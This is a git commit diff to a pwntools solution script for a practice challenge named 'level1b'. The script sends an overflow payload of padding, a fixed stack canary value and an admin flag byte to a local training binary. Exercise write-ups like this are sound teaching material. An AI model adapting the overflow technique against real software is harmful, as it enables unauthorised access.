bc126766c2851f5df30955fba46e23ed620858b8
Alex <alex@Vah-Naboris.local>
2023-02-25 15:58:34 -0500

    Fixed the solution for level1b

--- solutions/level1b.py
+++ solutions/level1b.py
@@ -1,8 +1,12 @@
 from pwn import *
 
+from struct import pack
 
+padding = b"A"*8
+canary = pack("<I", 0xdeadbeef)
+admin = b"\x01"
 level1b = process("../release/level1b")
 
 print("[*] recived {}".format(level1b.recvline().strip()))
-level1b.sendline(b"\x01" * 14)
+level1b.sendline(padding + canary + admin)
 print("[*] recived {}".format(level1b.recvline()))
